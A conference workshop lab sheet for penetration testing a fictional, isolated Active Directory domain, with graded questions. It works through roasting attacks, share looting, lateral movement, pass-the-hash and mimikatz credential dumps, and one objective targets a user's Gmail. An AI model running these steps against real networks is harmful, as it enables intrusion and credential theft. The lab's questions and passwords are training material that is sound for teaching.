# SINCON 2025 - Introduction to Active Directory Pentesting

ASYNC Security Labs is a US-based technology company focused on delivering cutting-edge virtualization platforms, backend infrastructure solutions, and enterprise application deployment tools. Its internal operations are anchored within the `async.local` Active Directory forest, which manages privileged service accounts, executive systems, and development environments.

As part of an ongoing domain migration from a legacy environment to the `async.local` forest, ASYNC has engaged a security assessment to proactively identify misconfigurations, privilege escalation paths, and other potential vulnerabilities within its Active Directory infrastructure.

The first phase of the assessment will be conducted with access limited to **3** isolated machines within the `async.local` domain. These systems have been segmented from the broader network to allow for controlled testing while minimizing impact on production infrastructure.

## Objectives

* By any means, obtain `Domain Admin` access to the `async.local` domain.

## Extra Miles

By identifying, and exploiting any misconfigurations or vulnerabilities within the `async.local` domain, attempt to obtain the following:

* **EM1**. Domain Credentials for the `svc_sql` account
* **EM2**. Domain Credentials for the CEO of `ASYNC.LOCAL`
* **EM3**. Compromise `Tyler_ROSE`'s account without Kerberoasting
* **EM4**. Obtain `Tyler_ROSE`'s Gmail (https://mail.google.com/) credentials, and check their inbox.
* **EM5**. Compromise the `svc_async` user without forcibly changing their password (hint: ADCS is installed!)

## Network Recon

In order to save time (and network resources), an `nmap` scan has already been performed on the target machines. The results are as follows, although you will probably not need to use any of this information.

```
Nmap scan report for DC.async.local (10.2.10.2)
Host is up (0.0081s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-17 11:03:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: async.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.async.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.async.local
| Not valid before: 2025-04-27T16:43:36
|_Not valid after:  2026-04-27T16:43:36
|_ssl-date: 2025-05-17T11:05:04+00:00; -9s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: async.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-17T11:05:04+00:00; -9s from scanner time.
| ssl-cert: Subject: commonName=dc.async.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.async.local
| Not valid before: 2025-04-27T16:43:36
|_Not valid after:  2026-04-27T16:43:36
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: async.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-17T11:05:04+00:00; -9s from scanner time.
| ssl-cert: Subject: commonName=dc.async.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.async.local
| Not valid before: 2025-04-27T16:43:36
|_Not valid after:  2026-04-27T16:43:36
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: async.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-17T11:05:04+00:00; -9s from scanner time.
| ssl-cert: Subject: commonName=dc.async.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.async.local
| Not valid before: 2025-04-27T16:43:36                                                                                                                                    
|_Not valid after:  2026-04-27T16:43:36                                                                                                                                    
3389/tcp open  ms-wbt-server Microsoft Terminal Services                                                                                                                   
| rdp-ntlm-info: 
|   Target_Name: async
|   NetBIOS_Domain_Name: async
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: async.local
|   DNS_Computer_Name: dc.async.local
|   DNS_Tree_Name: async.local
|   Product_Version: 10.0.20348
|_  System_Time: 2025-05-17T11:04:23+00:00
| ssl-cert: Subject: commonName=dc.async.local
| Not valid before: 2025-04-26T13:16:05
|_Not valid after:  2025-10-26T13:16:05
|_ssl-date: 2025-05-17T11:05:04+00:00; -9s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -9s, deviation: 0s, median: -9s
| smb2-time: 
|   date: 2025-05-17T11:04:24
|_  start_date: N/A

Nmap scan report for FS.async.local (10.2.10.16)
Host is up (0.0066s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: async
|   NetBIOS_Domain_Name: async
|   NetBIOS_Computer_Name: FS
|   DNS_Domain_Name: async.local
|   DNS_Computer_Name: fs.async.local
|   DNS_Tree_Name: async.local
|   Product_Version: 10.0.20348
|_  System_Time: 2025-05-17T11:04:24+00:00
| ssl-cert: Subject: commonName=fs.async.local
| Not valid before: 2025-04-26T13:27:40
|_Not valid after:  2025-10-26T13:27:40
|_ssl-date: 2025-05-17T11:05:04+00:00; -9s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -9s, deviation: 0s, median: -9s
| smb2-time: 
|   date: 2025-05-17T11:04:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for DEV.async.local (10.2.10.173)
Host is up (0.0067s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dev.async.local
| Not valid before: 2025-04-26T13:28:06
|_Not valid after:  2025-10-26T13:28:06
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: async
|   NetBIOS_Domain_Name: async
|   NetBIOS_Computer_Name: DEV
|   DNS_Domain_Name: async.local
|   DNS_Computer_Name: dev.async.local
|   DNS_Tree_Name: async.local
|   Product_Version: 10.0.22621
|_  System_Time: 2025-05-17T11:04:24+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -9s, deviation: 0s, median: -9s
| smb2-time: 
|   date: 2025-05-17T11:04:37
|_  start_date: N/A

Post-scan script results:
| clock-skew: 
|   -9s: 
|     10.2.10.2 (DC.async.local)
|     10.2.10.16 (FS.async.local)
|_    10.2.10.173 (DEV.async.local)
```

## Lab Environment

The lab environment consists of three isolated machines:
* DC.async.local (10.2.10.2)
* FS.async.local (10.2.10.16)
* DEV.async.local (10.2.10.173)

Create a workspace, we will be using this workspace `rvtraining`:
```
mkdir rvtraining
cd rvtraining 
```

Install impacket:
```
python3 -m pipx install impacket
pipx completions
```

Install PowerView:
```
sudo apt install libkrb5-dev
pipx install "git+https://github.com/aniqfakhrul/powerview.py"
```

Install BloodyAD:
```
sudo apt install bloodyad
```

And an elastic instance located at: https://10.2.10.12:5601/ which is out of scope for this exercise.

The following should be added to your `/etc/hosts` before starting the lab to have the names resolve correctly:
```
10.2.10.2    DC.async.local   async.local
10.2.10.16   FS.async.local
10.2.10.173  DEV.async.local
```

Any reference to `targets.txt` in this lab sheet refers to the following contents:

```
┌──(kali㉿kali)-[~/sincon]
└─$ cat targets.txt
DC.async.local
FS.async.local
DEV.async.local
```

## Exercise 1: Initial Access

### 1.1. NULL Sessions

NULL Sessions are a type of connection that doesn't any credentials to the target machine, this is often disabled by default in most systems. When connecting with this type of session, you will connect as the "Anonymous Logon" built-in account.

```
nxc smb targets.txt -u '' -p ''
SMB         10.2.10.2       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:async.local) (signing:True) (SMBv1:False) 
SMB         10.2.10.16      445    FS               [*] Windows Server 2022 Build 20348 x64 (name:FS) (domain:async.local) (signing:False) (SMBv1:False) 
SMB         10.2.10.173     445    DEV              [*] Windows 11 Build 22621 x64 (name:DEV) (domain:async.local) (signing:False) (SMBv1:False) 
SMB         10.2.10.2       445    DC               [+] async.local\: 
SMB         10.2.10.16      445    FS               [-] async.local\: STATUS_ACCESS_DENIED 
SMB         10.2.10.173     445    DEV              [-] async.local\: STATUS_ACCESS_DENIED
```

### 1.2. Guest Sessions

When an incorrect username/password are provided, Windows will default to the Guest account. This is a built-in account that is disabled by default, but can be enabled by an administrator. This account has very limited permissions, but it can be used to enumerate some information about the target machine.

```
nxc smb targets.txt -u 'guest' -p ''
SMB         10.2.10.16      445    FS               [*] Windows Server 2022 Build 20348 x64 (name:FS) (domain:async.local) (signing:False) (SMBv1:False) 
SMB         10.2.10.2       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:async.local) (signing:True) (SMBv1:False) 
SMB         10.2.10.173     445    DEV              [*] Windows 11 Build 22621 x64 (name:DEV) (domain:async.local) (signing:False) (SMBv1:False) 
SMB         10.2.10.16      445    FS               [+] async.local\guest: 
SMB         10.2.10.2       445    DC               [-] async.local\guest: STATUS_ACCOUNT_DISABLED 
SMB         10.2.10.173     445    DEV              [-] async.local\guest: STATUS_ACCOUNT_DISABLED 
```

**Q1**: What shares are available on the `FS` machine when connected using the Guest account?

### 1.3. Looting Shares

You should be able to identify that the `public_docs` share is available on the `FS` machine as a `Guest` user, we can connect to the share and enumerate the contents.

```
smbclient.py 'guest'@fs.async.local 
Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use public_docs
# ls
drw-rw-rw-          0  Sun Apr 27 12:43:19 2025 .
drw-rw-rw-          0  Sun Apr 27 12:43:56 2025 ..
-rw-rw-rw-        608  Sun Apr 27 12:43:19 2025 migration.txt
-rw-rw-rw-        515  Sun Apr 27 12:43:19 2025 team_contact_list.csv
-rw-rw-rw-        146  Sun Apr 27 12:43:19 2025 team_contact_list.txt
#
# get team_contact_list.csv
```

**Q2**: What is the name of the file that contains the list of team leaders?

### 1.4. Enumerating Users

Using the names identified in the above exercise, we can enumerate the users in the `async.local` using the kerberos protocol. You may use the following one-liner to convert the `csv` into a list of usernames:

```bash
awk -F ',' '{print $2}' team_contact_list.csv | tail -n +2 | tee users.txt

cat users.txt
Alice_LIM
John_SMITH
James_PARKER.FROM.LG
Sarah_DAVIS
Emily_WILSON
```

These usernames can be sprayed with the following command:

```
nxc smb dc.async.local -u users.txt -p '' --kerberos
```

**Q3**: How many of the users are valid domain users?

**Q4**: Which user is vulnerable to an asreproast attack?

### 1.5. Roasting

An asreproast attack is a type of attack that targets users with the `DoNotRequirePreAuth` flag set. This flag allows the user to authenticate without providing a password in the `AS-REQ` message. This means that the attacker can request a TGT for the user, and crack the TGT offline to obtain their password.

The following command can be used to obtain an encrypted TGT for the user:

```
nxc ldap DC.async.local -u 'James_PARKER.FROM.LG' -p '' --asreproast 'james.parker.tgt.enc'
LDAP        10.2.10.2       389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:async.local)
LDAP        10.2.10.2       389    DC               $krb5asrep$23$James_PARKER.FROM.LG@ASYNC.LOCAL:d79b5c36bf86ca32574b1af718023d21$3b40f6835[..snip..]8dfa94a6 
```

**Q5**: What is the password for the `James_PARKER.FROM.LG` account?

## Exercise 2: Authenticated Enumeration

With access to the `James_PARKER.FROM.LG` account, we can now enumerate the domain as a `Domain User`. If you were not able to crack the password for the `James_PARKER.FROM.LG` account for any reason, you can use the following password to access the account:

```
James_PARKER.FROM.LG
november11
```

### 2.1. Enumerating Shares

We can enumerate shares on all of the domain computers using the following command:

```
nxc smb targets.txt -u 'James_PARKER.FROM.LG' -p 'november11' --shares
```

**Q6**: What additional shares can we access on the `FS` machine?

**Q7**: Which default share stores domain-wide information such as GPO configurations and user profiles?

### 2.1.1. Accessing Shares

With new access to `FS`, we can now loot the `developers` share. This share is most likely misconfigured as our current user (`James_PARKER.FROM.LG`) is not part of the `Developers` group. We can use the following command to check our group memberships:

```
powerview 'James_PARKER.FROM.LG':'november11'@dc.async.local

(LDAPS)-[dc.async.local]-[async\James_PARKER.FROM.LG]
PV > Get-DomainUser -Identity 'James_PARKER.FROM.LG' -Properties memberOf
```

And the following command to check the members and attributes of the `Developers` group:

```
(LDAPS)-[dc.async.local]-[async\James_PARKER.FROM.LG]
PV > Get-DomainGroup -Identity 'Developers'
```

**Q8**: How many members are in the `Developers` group?

We can begin looting the `developers` share using the following command:

```
smbclient.py 'James_PARKER.FROM.LG':'november11'@fs.async.local                                   
Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use developers
# 
```

Looting this share will lead you down the path to **EM2**. 

## 2.2. Kerberos Attacks

Besides looting shares, we can perform a number of Kerberos attacks after obtaining a domain user.

### 2.2.1. Asreproasting

You may recall earlier that we were able to asreproast the `James_PARKER.FROM.LG` account. We can use the same technique to asreproast other users in the domain. The following command can be used to enumerate all users with the `DoNotRequirePreAuth` flag set:

```
powerview 'James_PARKER.FROM.LG':'november11'@dc.async.local

(LDAPS)-[dc.async.local]-[async\James_PARKER.FROM.LG]
PV > Get-DomainUser -PreAuthNotRequired -Properties sAMAccountName
```

**Q9**: How many users are vulnerable to asreproasting?

We can asreproast all of the above users using the following command:

```
nxc ldap DC.async.local -u 'James_PARKER.FROM.LG' -p 'november11' --asreproast asreproast.out 
LDAP        10.2.10.2       389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:async.local)
LDAP        10.2.10.2       389    DC               [+] async.local\James_PARKER.FROM.LG:november11 
LDAP        10.2.10.2       389    DC               [*] Total of records returned 7
```

**Q10**: What is the password for `Taylor_PARRY@ASYNC.LOCAL`?

### 2.2.2. Kerberoasting

Another attack we can perform is Kerberoasting. This attack targets service accounts that have the `Service Principal Name` (SPN) attribute set. These accounts are often used to run services on the domain, and their passwords are often weak or not changed regularly.

We can enumerate all service accounts in the domain using the following command:

```
powerview 'James_PARKER.FROM.LG':'november11'@dc.async.local

(LDAPS)-[dc.async.local]-[async\James_PARKER.FROM.LG]
PV > Get-DomainUser -SPN -Properties sAMAccountName
sAMAccountName     : svc_vdi
sAMAccountName     : svc_sql
sAMAccountName     : svc_web
```

We can kerberoast all of the above accounts using the following command:

```
nxc ldap DC.async.local -u 'James_PARKER.FROM.LG' -p 'november11' --kerberoast kerberoast.out
```

**Q11**: What is the password for the `svc_web` account?

## 2.1.2. Re-enumerating the Domain

Using the newly acquired users: `svc_web` and `Taylor_PARRY`, we can begin re-enumerating the domain. If you were unable to compromise either of these accounts, you can use the following credentials to access the accounts:

```
Taylor_PARRY : karencita
svc_web : webmaster
```

Firstly, with `Taylor_PARRY` - you will find that you are part of the `Developers` group.

```
(LDAPS)-[dc.async.local]-[async\James_PARKER.FROM.LG]
PV > Get-DomainUser -Identity Taylor_PARRY -Properties memberOf    
memberOf     : CN=Developers,CN=Users,DC=async,DC=local
               CN=Legacy Users,CN=Users,DC=async,DC=local
```

**Q12**: What machine is `Taylor_PARRY` a local administrator on?

Next, with `svc_web` - you will find that you have access to new shares on `FS`.

**Q13**: What new shares are available on `FS` when connected with `svc_web`?

## 2.1.3. Re-enumerating Shares

With `svc_web`, we can loot the new shares on `FS`. The following command can be used to enumerate the shares:

```
smbclient.py 'svc_web':'webmaster'@FS.async.local              
Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use svc_home$
# tree
/svc_sql/config.xml
/svc_sql/sqlcmd_output.log
/svc_vdi/hd.key
/svc_vdi/s
/svc_web/web.config
/svc_web/web.debug.config
Finished - 9 files and folders
# 
```

Although we are authenticated as the `svc_web` user, we are also able to access the files of the `svc_sql` and `svc_vdi` users. This is most likely a misconfiguration.

**Q14**: What is the password for the `Tyler_ROSE` user?

## Exercise 3: Lateral Movement

Previously, we compromised the `Tyler_ROSE` account. If you were unable to do so, you can use the following credentials to access the account:

```
Tyler_ROSE : OyShGdq86AIG8RzdaAS5L
```

We can identify that `Tyler_ROSE` is part of the `Fileshare Admins` group, as well as the `Developers` group.

```
powerview 'James_PARKER.FROM.LG':'november11'@dc.async.local
(LDAPS)-[dc.async.local]-[async\James_PARKER.FROM.LG]
PV > Get-DomainUser -Identity Tyler_ROSE -Properties memberOf
memberOf     : CN=Developers,CN=Users,DC=async,DC=local
               CN=Fileshare Admins,CN=Users,DC=async,DC=local
```

**Q15**: Which machine (aside from `DEV`) is `Tyler_ROSE` a local administrator on?

### 3.1. Local Administrator

In the lab environment, `FS` has been configured to disable Windows Defender - as such you do not have to worry about tools being blocked by the AV. You can use your local administrator access to obtain a shell using many of the tools exposed by Impacket:

```
psexec.py 'Tyler_ROSE':'OyShGdq86AIG8RzdaAS5L'@fs.async.local
wmiexec.py 'Tyler_ROSE':'OyShGdq86AIG8RzdaAS5L'@fs.async.local
atexec.py 'Tyler_ROSE':'OyShGdq86AIG8RzdaAS5L'@fs.async.local whoami
evil-winrm -i 'fs.async.local' -u 'Tyler_ROSE' -p 'OyShGdq86AIG8RzdaAS5L' --ssl
```

You will notice that some tools (such as `psexec.py`) will not work on `DEV` as it is configured with Windows Defender enabled. It is not possible to disable Windows Defender on `DEV`, unless you disable it via the GUI as Tamper Protection is enabled.

```
psexec.py 'Tyler_ROSE':'OyShGdq86AIG8RzdaAS5L'@dev.async.local
Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dev.async.local.....
[*] Found writable share ADMIN$
[*] Uploading file gLXJdsQD.exe
[*] Opening SVCManager on dev.async.local.....
[*] Creating service WswJ on dev.async.local.....
[*] Starting service WswJ.....
...
# hangs here
...
```

Once we are on `FS`, we can see that the mapped shares are on disk at `C:\shares`. Additionally, we can confirm that `async\Service Accounts` have full access to the `svc_home$` share located at `C:\shares\svc_home$`

```
*Evil-WinRM* PS C:\shares> Get-SmbShareAccess -Name "svc_home$"

Name      ScopeName AccountName            AccessControlType AccessRight
----      --------- -----------            ----------------- -----------
svc_home$ *         async\Service Accounts Allow             Full


*Evil-WinRM* PS C:\shares> Get-SmbShare -Name "svc_home$"

Name      ScopeName Path                Description
----      --------- ----                -----------
svc_home$ *         C:\shares\svc_home$ Common share for service accounts.
```

And, internally within the `svc_home$` share, we can see that all users have the same permissions.

```
*Evil-WinRM* PS C:\shares> Get-Acl C:\shares\svc_home$ | Format-List


Path   : Microsoft.PowerShell.Core\FileSystem::C:\shares\svc_home$
Owner  : BUILTIN\Administrators
Group  : async\Domain Users
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  AppendData
         BUILTIN\Users Allow  CreateFiles
         CREATOR OWNER Allow  268435456
Audit  :
Sddl   : O:BAG:DUD:AI(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;0x1200a9;;;BU)(A;CIID;LC;;;BU)(A;CIID;DC;;;BU)(A;OICIIOID;GA;;;CO)
```

**Q16**: What is the `AccountName` of the group that have `Full` rights to the `developers` share? (example: `async\GroupName`)

### 3.2. Living-Off-The-Land

> If you're playing in our CTF, this might help you :P

In mature environments, it's likely that AV and EDR solutions are deployed. These solutions can be bypassed by using built-in Windows tools and protocols to perform actions that seem "normal" to the system. This is known as "Living-Off-The-Land" (LOTL) techniques.

For example, the `evil-winrm` tool can be used to utilize the `WinRM` protocol to obtain a shell on the target machine. This tool does not have many OOTB (Out-Of-The-Box) IOCs, except if you use the additional functionalities such as `Invoke-Binary` etc.

There are many alternatives to `evil-winrm` if you are unsatisfied with the tool (as it does a lot of things under the hood):

```
minrm -i 'fs.async.local' -u 'Tyler_ROSE' -p 'OyShGdq86AIG8RzdaAS5L' --ssl       
[+] Creating WSMan object for Tyler_ROSE@fs.async.local
[*] Verifying connection to Tyler_ROSE@fs.async.local
[+] Connected to Tyler_ROSE@fs.async.local
[!] be careful with what you execute! this is not a real shell
[tyler_rose@fs.async.local] PS> whoami
Output:
async\tyler_rose

[tyler_rose@fs.async.local] PS> 
```

Alternatively (a bit buggy), you can use `pwsh`'s `Enter-PSSession` command to obtain a shell on the target machine:

```
$pass = ConvertTo-SecureString "OyShGdq86AIG8RzdaAS5L" -AsPlainText
$cred = New-Object System.Management.Automation.PSCredential('Tyler_ROSE@async.local', $pass)
$opt = New-PSSessionOption -SkipCACheck -SkipCNCheck
$session = New-PSSession -ComputerName fs.async.local -Credential $cred -Authentication Negotiate -UseSSL -SessionOption $opt
Enter-PSSession -Session $session

[fs.async.local]: PS C:\Users\Tyler_ROSE\Documents> whoami
async\tyler_rose
```

## Exercise 4: Credential Harvesting

After obtaining local administrator access on a domain-joined machine, it is common to find credentials stored both on disk (via registry hives) and in memory (LSASS.exe).

If you're using `mimikatz` with Evil-WinRM or any other "fork and run" shell, remember to suffix every command with "exit" to ensure that the shell is closed properly.

Some keys are only accessible by `SYSTEM`, and as a result you'll need to escalate to `NT AUTHORITY\SYSTEM` to access them. `mimikatz` helps with this by allowing you to run commands as `SYSTEM` using the `token::elevate` command.

```
mimikatz(commandline) # lsadump::sam
Domain : FS
SysKey : da7f3024df727946f1eaf1a2056acd53
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz(commandline) # exit
Bye!
```

### 4.1. SAM

SAM contains local user accounts and groups, as well as their hashed passwords. The SAM file is located at `C:\Windows\System32\config\SAM` and is protected by the operating system. However, it can be accessed by the local SYSTEM account.

```
*Evil-WinRM* PS C:\windows\tasks> .\mimikatz.exe "token::elevate" "lsadump::sam" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

720     {0;000003e7} 1 D 33311          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;3fcbd9f2} 0 D 1070426206  async\Tyler_ROSE        S-1-5-21-2085372437-1578838935-3393986013-1372  (11g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1070526771  NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : FS
SysKey : da7f3024df727946f1eaf1a2056acd53
Local SID : S-1-5-21-2179374997-3008092852-1119610992

SAMKey : abdec5baf07fabeb1041df680b03351f

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 71814d1859b0978e96b4b558548ba860
...
```

This local administrator hash can be used to access the `FS` machine using the `--local-auth` flag, do note that this password rotates so it may not be valid for long.

```
nxc smb fs.async.local -u 'Administrator' -H '71814d1859b0978e96b4b558548ba860' --local-auth
SMB         10.2.10.16      445    FS               [*] Windows Server 2022 Build 20348 x64 (name:FS) (domain:FS) (signing:False) (SMBv1:False) 
SMB         10.2.10.16      445    FS               [+] FS\Administrator:71814d1859b0978e96b4b558548ba860 (Pwn3d!)
```

### 4.2. Cache (DCC)

Domain Cached Credentials (DCC) allow users to log in with their domain accounts even when a machine is disconnected from the network. Windows store these credentials at `HKLM\Security\Cache`. These credentials are encrypted and not stored in the `NTLM` hash format, so they cannot be relayed and only cracked offline.

```
*Evil-WinRM* PS C:\windows\tasks> .\mimikatz.exe "token::elevate" "lsadump::cache" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

720     {0;000003e7} 1 D 33311          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;3fcbd9f2} 0 D 1070684718  async\Tyler_ROSE        S-1-5-21-2085372437-1578838935-3393986013-1372  (11g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1070785784  NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::cache
Domain : FS
SysKey : da7f3024df727946f1eaf1a2056acd53

Local name : FS ( S-1-5-21-2179374997-3008092852-1119610992 )
Domain name : async ( S-1-5-21-2085372437-1578838935-3393986013 )
Domain FQDN : async.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {8f01388d-7b0e-aa21-55a7-1577434f91cb}
  [00] {8f01388d-7b0e-aa21-55a7-1577434f91cb} d1501d2e51d6d67bf83166f88e14baa2177c3c3b4337ebe40ee1a22bd7c7ba85

* Iteration is set to default (10240)

[NL$1 - 4/27/2025 9:53:28 PM]
RID       : 00000450 (1104)
User      : async\User
MsCacheV2 : 0f1ee2e3f11b21fbdd224f903e4b46d7

[NL$2 - 4/29/2025 5:40:40 PM]
RID       : 0000055d (1373)
User      : async\Austin_BROOKS
MsCacheV2 : 2125a57bf5b3109b9644f177290abee7

[NL$3 - 4/29/2025 4:50:36 PM]
RID       : 0000055f (1375)
User      : async\James_PARKER.FROM.LG
MsCacheV2 : 4411bd6bdfd17c963976175582e1d810

[NL$4 - 4/29/2025 1:34:34 AM]
RID       : 0000055c (1372)
User      : async\Tyler_ROSE
MsCacheV2 : 35395e499150d17b2597e43e680c8870

mimikatz(commandline) # exit
Bye!
```

These caches can be cracked offline when transformed into the right `DCC2` format, see: [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes).

**Q17**: What is the hashcat hash-mode for "Domain Cached Credentials 2 (DCC2), MS Cache 2" hashes? (i.e. 1420)

### 4.3. LSA Secrets

LSA secrets are stored in `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets` and are used to store sensitive information such as passwords, keys, and other secrets associated with the computer's domain account.

```
*Evil-WinRM* PS C:\windows\tasks> .\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

720     {0;000003e7} 1 D 33311          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;3fcbd9f2} 0 D 1071015913  async\Tyler_ROSE        S-1-5-21-2085372437-1578838935-3393986013-1372  (11g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1071109261  NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::secrets
Domain : FS
SysKey : da7f3024df727946f1eaf1a2056acd53

Local name : FS ( S-1-5-21-2179374997-3008092852-1119610992 )
Domain name : async ( S-1-5-21-2085372437-1578838935-3393986013 )
Domain FQDN : async.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {8f01388d-7b0e-aa21-55a7-1577434f91cb}
  [00] {8f01388d-7b0e-aa21-55a7-1577434f91cb} d1501d2e51d6d67bf83166f88e14baa2177c3c3b4337ebe40ee1a22bd7c7ba85

Secret  : $MACHINE.ACC
cur/text: ,rgG(wIv=bliUW%`_Y:Tb!m`ss.wHI=m/UD[Q*ljJcF&Rf75:tIyZeJ"OjcZD>5KCF&8a7M(uIg2sqtdsn1kexkb]^&.23BTA]H'vXn[K?[v$l4w3-W7b4&%
    NTLM:4099f434b910d7cae4e2e25417da3fa6
    SHA1:20d32659eb15ff4ca1365915e5a3aa1409b667f7
old/text: ,rgG(wIv=bliUW%`_Y:Tb!m`ss.wHI=m/UD[Q*ljJcF&Rf75:tIyZeJ"OjcZD>5KCF&8a7M(uIg2sqtdsn1kexkb]^&.23BTA]H'vXn[K?[v$l4w3-W7b4&%
    NTLM:4099f434b910d7cae4e2e25417da3fa6
    SHA1:20d32659eb15ff4ca1365915e5a3aa1409b667f7

Secret  : DefaultPassword
cur/text: password
old/text: password

Secret  : DPAPI_SYSTEM
